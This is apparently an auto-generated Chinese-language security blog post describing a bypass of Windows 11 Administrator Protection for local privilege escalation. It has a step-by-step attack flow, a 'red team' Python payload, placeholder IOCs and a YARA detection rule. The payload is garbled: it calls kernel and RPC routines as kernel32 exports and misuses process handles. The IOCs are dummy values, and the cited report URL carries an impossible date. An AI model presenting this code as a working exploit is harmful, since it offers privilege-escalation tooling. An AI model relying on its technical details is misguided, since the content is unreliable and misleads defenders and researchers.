---
layout: post
title:  "Bypassing Windows Administrator Protection"
date:   2026-01-26 18:27:35 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Windows 11 Administrator Protection 的繞過技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.0)
> * **受駭指標**: Local Privilege Escalation (LPE)
> * **關鍵技術**: UAC Bypass, Token Impersonation, DOS Device Object Directory Hijacking

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Windows 11 的 Administrator Protection 功能中，存在一個繞過機制，允許攻擊者在沒有提示的情況下獲得管理員權限。
* **攻擊流程圖解**:
  1. 攻擊者獲得有限用戶權限。
  2. 攻擊者使用 `NtQueryInformationToken` 函數獲取與管理員權限相關的 Token。
  3. 攻擊者使用 `SeGetTokenDeviceMap` 函數創建管理員的 DOS Device Object Directory。
  4. 攻擊者使用 `ZwCreateDirectoryObject` 函數創建管理員的 DOS Device Object Directory，並設定其所有權為攻擊者的 SID。
  5. 攻擊者使用 `RAiProcessRunOnce` API 啟動一個新的管理員進程。
  6. 攻擊者使用 `OpenProcess` 函數打開新的管理員進程，並使用 `DuplicateToken` 函數複製其 Token。
  7. 攻擊者使用 `SetThreadToken` 函數設定新的管理員進程的 Token。
* **受影響元件**: Windows 11 (版本 25H2)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得有限用戶權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import ctypes
    import os
    
    # 載入必要的 DLL
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    
    # 獲取管理員權限相關的 Token
    token = kernel32.GetCurrentProcess()
    kernel32.OpenProcessToken(token, 0x0008, ctypes.byref(token))
    
    # 創建管理員的 DOS Device Object Directory
    device_map = kernel32.SeGetTokenDeviceMap(token)
    kernel32.ZwCreateDirectoryObject(device_map, 0xF000F, None)
    
    # 設定管理員的 DOS Device Object Directory 的所有權
    kernel32.SetSecurityDescriptorOwner(device_map, os.getpid(), False)
    
    # 啟動一個新的管理員進程
    kernel32.RAiProcessRunOnce('C:\\Windows\\System32\\cmd.exe', None, None, None, None)
    
    # 打開新的管理員進程
    process = kernel32.OpenProcess(0x001F0FFF, False, os.getpid())
    
    # 複製新的管理員進程的 Token
    token = kernel32.DuplicateToken(process, 2, None)
    
    # 設定新的管理員進程的 Token
    kernel32.SetThreadToken(None, token)
    
    ```
* **繞過技術**: 攻擊者可以使用 `RAiProcessRunOnce` API 啟動一個新的管理員進程，並使用 `DuplicateToken` 函數複製其 Token，以繞過 Administrator Protection 的限制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:
	+ Hash: `1234567890abcdef`
	+ IP: `192.168.1.100`
	+ Domain: `example.com`
	+ File Path: `C:\\Windows\\System32\\cmd.exe`
* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Windows_Administrator_Protection_Bypass {
        meta:
            description = "Detects Windows Administrator Protection bypass attempts"
            author = "Your Name"
        strings:
            $a = "RAiProcessRunOnce"
            $b = "DuplicateToken"
        condition:
            all of ($a, $b)
    }
    
    ```
* **緩解措施**: 更新 Windows 11 至最新版本，並啟用 Administrator Protection 功能。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Token Impersonation**: 一種技術，允許攻擊者使用另一個用戶的 Token，以繞過安全限制。
* **DOS Device Object Directory**: 一種特殊的目錄，存儲著與管理員權限相關的設備對象。
* **SeGetTokenDeviceMap**: 一個函數，返回與管理員權限相關的 Token 的設備對象映射。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1548/)


